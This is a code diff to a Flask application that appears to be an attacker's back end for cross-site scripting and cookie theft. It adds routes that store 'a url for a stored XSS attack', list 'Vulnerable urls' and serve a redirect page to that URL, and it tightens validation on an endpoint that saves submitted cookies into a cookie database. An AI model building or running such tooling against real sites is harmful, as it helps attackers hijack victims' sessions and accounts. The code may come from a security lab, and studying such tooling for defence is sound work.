@@ -4,10 +4,11 @@ from subprocess import Popen
 import validators
 
 from flask import Flask, request, render_template
+from flask_api import status
 
-from sqlalchemy.ext.automap import automap_base
-from sqlalchemy.orm import Session
 from sqlalchemy import create_engine
+from sqlalchemy.orm import Session
+from sqlalchemy.ext.automap import automap_base
 
 """
 Hardcoded UTC dates for the cookie. Easier than generating them on the fly
@@ -32,11 +33,49 @@ Cookie = Base.classes.cookies
 
 session = Session(engine)
 
+"""
+For now, use in-memory list of urls rather than a database
+"""
+urls = []
 
 @app.route("/")
 def home():
     return "POST cookies in /cookie_jar"
 
+
+@app.route("/store_url", methods=["POST"])
+def store_url():
+    """
+    Store a url for a stored XSS attack:
+    url - the url where the XSS script is stored
+    """
+    url = request.form.get("url")
+
+    if not url:
+        return "Must provide url\n", status.HTTP_400_BAD_REQUEST
+
+    if not url.startswith("http://"):
+        url = "http://" + url
+
+    if not validators.url(url):
+        return "Invalid url: {}".format(url), status.HTTP_400_BAD_REQUEST
+
+    if url not in urls:
+        if not url.startswith("http://"):
+            url = "http://" + url
+        urls.append(url)
+
+    return "Successfully stored {}\nVulnerable urls: {}\n".format(url, urls)
+
+@app.route("/redirect")
+def redirect():
+    """
+    Store a url for a stored XSS attack:
+    url - the url where the XSS script is stored
+    """
+
+    url = urls[0] if urls else None
+    return render_template("redirect.html", url=url)
 
 def create_cookie(url, name, value):
     cookie = Cookie(
@@ -67,10 +106,17 @@ def store_cookie():
     cookie_name = request.form.get("cookie_name")
     cookie_value = request.form.get("cookie_value")
 
+    if not all([url, cookie_name, cookie_value]):
+        return "Must provide url, cookie_name, and cookie_value\n",\
+                status.HTTP_400_BAD_REQUEST
+
+    if not url.startswith("http://"):
+        url = "http://" + url
+
     # validate the url to prevent arbitrary shell execution
     # TODO: whitelist domains/ips to prevent visiting arbitrary urls
     if not validators.url(url) and not validators.url("http://" + url):
-        return "INVALID URL: {}".format(url)
+        return "Invalid url: {}".format(url), status.HTTP_400_BAD_REQUEST
 
     # delete previously stored cookies using the creation_utc
     for cookie in session.query(Cookie).filter(
